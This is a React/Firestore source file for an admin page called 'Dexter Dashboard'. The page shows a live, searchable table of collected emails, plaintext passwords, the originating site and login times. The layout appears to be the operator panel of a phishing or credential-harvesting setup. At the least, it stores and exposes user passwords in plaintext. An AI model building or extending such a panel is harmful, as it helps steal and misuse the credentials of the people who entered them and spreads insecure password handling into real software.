import { useEffect, useState } from "react";
import { db } from "../../utils/firebase";
import { collection, onSnapshot, query, orderBy } from "firebase/firestore";

export default function AdminPage() {
  const [users, setUsers] = useState([]);
  const [search, setSearch] = useState("");
  const [filteredUsers, setFilteredUsers] = useState([]);

  useEffect(() => {
    // Real-time listener for Firestore
    const usersRef = collection(db, "accounts");
    const q = query(usersRef, orderBy("loginAt", "desc"));

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const userData = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
        loginAt: doc.data().loginAt?.toDate()?.toLocaleString() || "N/A",
      }));
      setUsers(userData);
      setFilteredUsers(userData); // Initialize with all users
    });

    return () => unsubscribe(); // Cleanup listener on component unmount
  }, []);

  // Handle search input
  const handleSearch = (e) => {
    const value = e.target.value.toLowerCase();
    setSearch(value);
    const filtered = users.filter(
      (user) =>
        user.email.toLowerCase().includes(value) ||
        user.site.toLowerCase().includes(value)
    );
    setFilteredUsers(filtered);
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.heading}>Dexter Dashboard</h1>
      <div style={styles.searchContainer}>
        <input
          type="text"
          placeholder="Search by email or site..."
          value={search}
          onChange={handleSearch}
          style={styles.searchBar}
        />
      </div>
      <div style={styles.tableWrapper}>
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>Email</th>
              <th style={styles.th}>Password</th>
              <th style={styles.th}>Site</th>
              <th style={styles.th}>Login At</th>
            </tr>
          </thead>
          <tbody>
            {filteredUsers.map((user) => (
              <tr key={user.id}>
                <td style={styles.td}>{user.email}</td>
                <td style={styles.td}>{user.password}</td>
                <td style={styles.td}>{user.site}</td>
                <td style={styles.td}>{user.loginAt}</td>
              </tr>
            ))}
          </tbody>
        </table>
        {filteredUsers.length === 0 && (
          <p style={styles.noDataText}>No results found.</p>
        )}
      </div>
    </div>
  );
}

// Styles
const styles = {
  container: {
    margin: "20px auto",
    padding: "20px",
    fontFamily: "'Roboto', sans-serif",
    maxWidth: "900px",
    color: "#333",
    backgroundColor: "#f9f9f9",
    borderRadius: "8px",
    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
  },
  heading: {
    textAlign: "center",
    fontSize: "28px",
    fontWeight: "bold",
    color: "#333",
    marginBottom: "20px",
  },
  searchContainer: {
    textAlign: "center",
    marginBottom: "20px",
  },
  searchBar: {
    width: "80%",
    padding: "12px 15px",
    fontSize: "16px",
    borderRadius: "8px",
    border: "1px solid #ddd",
    outline: "none",
    transition: "border-color 0.3s ease",
  },
  tableWrapper: {
    overflowX: "auto",
  },
  table: {
    width: "100%",
    borderCollapse: "collapse",
    backgroundColor: "#fff",
    borderRadius: "8px",
    overflow: "hidden",
    boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.1)",
  },
  th: {
    backgroundColor: "#333",
    color: "#fff",
    textAlign: "left",
    padding: "12px 15px",
    fontWeight: "bold",
    fontSize: "16px",
    borderBottom: "1px solid #ddd",
  },
  td: {
    padding: "12px 15px",
    fontSize: "15px",
    borderBottom: "1px solid #ddd",
    textAlign: "left",
  },
  noDataText: {
    textAlign: "center",
    fontSize: "16px",
    color: "#666",
    marginTop: "20px",
  },
};
